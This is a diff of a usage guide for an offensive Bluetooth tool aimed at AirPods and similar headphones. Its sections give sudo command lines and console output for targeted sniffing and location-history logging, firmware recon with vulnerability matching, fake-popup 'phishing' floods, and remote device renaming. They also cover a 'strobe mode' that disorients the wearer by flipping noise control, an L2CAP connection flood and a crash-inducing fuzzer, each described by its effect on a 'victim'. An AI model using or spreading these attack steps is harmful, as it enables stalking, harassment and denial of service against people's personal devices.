@@ -33,84 +33,62 @@ Choose a model ID (default=1): 3
 
 ---
 
-## 🕵️ **2. Passive Sniffer**
-**Command**: `sudo python3 main.py -m sniff`
+## 🕵️ **2. Passive Sniffer (Targeted)**
+**Command**: `sudo python3 main.py -m sniff -t <MAC> --log-file pol.csv`
 
 ### 🖥️ Console Output
 ```text
-[*] Starting Passive Sniffer on hci0...
-┏━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━┳━━━━━━━━━━┓
-┃ MAC               ┃ Model               ┃ Battery (L/R/C)   ┃ Lid Open ┃ RSSI ┃ Last Seen┃
-┡━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━╇━━━━━━╇━━━━━━━━━━┩
-│ 11:22:33:44:55:66 │ AirPods Pro         │ 100%/100%/80%     │ No       │ -45  │ 12:00:01 │
-│ AA:BB:CC:DD:EE:FF │ [bold red]AirPods (SPOOF?)[/] │ ?/?/?             │ Yes      │ -30  │ 12:00:05 │
-└───────────────────┴─────────────────────┴───────────────────┴──────────┴──────┴──────────┘
+[*] Starting Passive Sniffer on hci0... [bold red]TARGETING <MAC>[/bold red]
+...
+(Only Target Device Appears)
 ```
-
-### 📊 Analyzed Result
-*   ✅ **Decoded Data**: Real-time display of nearby Apple devices.
-*   ✅ **State Detection**: Shows if the lid is open or closed and exact battery percentages.
-*   🚨 **Spoof Detection**: Flags suspicious packets.
+### 📊 Result
+*   **Log File**: `pol.csv` created containing `Timestamp, MAC, Model, RSSI, Status` history.
 
 ---
 
-## 🔍 **3. Recon Mode**
-**Command:** `sudo python3 main.py -t <TARGET_MAC> -m recon`
+## 🔍 **3. Advanced Recon**
+**Command**: `sudo python3 main.py -m recon -t <MAC>`
 
 ### 🖥️ Console Output
 ```text
-[*] Mode: recon
-[*] Target: AA:BB:CC:DD:EE:FF
-[+] Connected to AA:BB:CC:DD:EE:FF
-[*] Starting Metadata Recon...
-[+] Handshake Response: OK
-[+] Raw Metadata: 04001d00...
-[i] Decoded String content: AirPods Pro - GX8Z... - 5B58
+...
+Device Metadata Report:
+- Firmware: 3A283
+[bold red][!] VULNERABILITY DETECTED for Firmware 3A283:[/bold red]
+    - CVE-2020-9999 (Audio Buffer Overflow)
 ```
-
-### 🎯 Analyzed Result
-*   **Model Name**: "AirPods Pro"
-*   **Serial Number**: "GX8Z..." (Useful for tracking)
-*   **Firmware**: "5B58" (Useful for vulnerability matching)
 
 ---
 
-## 🎮 **4. Active Control (Hijack)**
-**Command**: `sudo python3 main.py -m control -t <TARGET_MAC>`
+## 🎮 **4. Social Engineering & Control**
+**Command**: `sudo python3 main.py -m control -t <MAC>` and `sudo python3 main.py -m advertise --phishing`
 
-### 🖥️ Console Output
-```text
-[*] Connecting to <TARGET> via L2CAP (PSM 0x1001)...
-[+] Connected!
-[*] Handshake sent.
+### 🎣 Phishing Mode (Advertise)
+*   **Console**: `[red]PHISHING MODE ACTIVE. Cycling all models...[/red]`
+*   **Physical**: Victim receives a barrage of "Not Your AirPods" popups for varying models (Pro, Max, Beats).
 
-Choose Action:
-1. Force Transparency (Hear Environment)
-2. Force ANC (Silence)
-3. Force Off (Normal)
+### 📛 Device Rename (Control)
+*   **Action**: Select Option 4 ("Rename Device") -> "Connection Failed"
+*   **Result**: Target device name changes in Bluetooth settings to "Connection Failed". (May require user action to refresh).
 
-aprpt-control > 1
-[*] Sent Noise Control Command: TRANSPARENCY
-```
-
-### 👂 Physical Result
-*   **Victim**: Suddenly hears outside noise as **Transparency Mode** is forcibly enabled.
+### 😵 Strobe Mode (Control)
+*   **Action**: Select Option 6 ("Strobe Mode")
+*   **Result**: Victim experiences rapid Disorienting shifts between ANC (Silence) and Transparency (Noise).
 
 ---
 
-## 🩸 **5. BLE Fuzzer (Bleed)**
-**Command**: `sudo python3 main.py -m bleed`
+## ⛔ **5. Availability & DoS**
 
-### 🖥️ Console Output
-```text
-[*] Mode: bleed
-[*] Starting BLE Fuzzer...
-[+] Sent 100 packets...
-[+] Sent 200 packets...
-```
+### 🔌 L2CAP Flood (`-m dos`)
+**Command**: `sudo python3 main.py -m dos -t <MAC>`
+*   **Console**: `[blue]Holding 50 connections open...[/blue]`
+*   **Physical**: Target device cannot connect to iPhone; user sees "Connection Failed" or endless spinner.
 
-### 💥 Physical Result
-*   **Victim**: Nearby devices experience UI lag, battery drain, or Bluetooth stack crashes.
+### 🩸 Protocol Fuzzing (`-m bleed -t <MAC>`)
+**Command**: `sudo python3 main.py -m bleed -t <MAC>`
+*   **Console**: `[yellow]sent 50 fuzz packets...[/yellow]` (Targeting PSM 0x1001)
+*   **Physical**: Target headphones may reboot, disconnect, or stop playing audio.
 
 ---
 
